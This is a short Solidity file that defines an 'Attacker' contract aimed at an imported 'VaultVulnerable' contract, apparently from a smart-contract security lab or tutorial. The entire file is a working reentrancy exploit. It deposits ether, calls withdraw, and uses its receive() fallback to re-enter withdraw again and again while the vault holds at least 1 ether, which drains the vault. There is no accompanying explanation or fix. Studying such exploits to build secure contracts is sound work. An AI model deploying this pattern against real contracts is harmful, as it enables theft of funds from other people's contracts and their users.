// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VaultVulnerable.sol";

contract Attacker {
    VaultVulnerable vault;

    constructor(address _vault) {
        vault = VaultVulnerable(_vault);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }
}
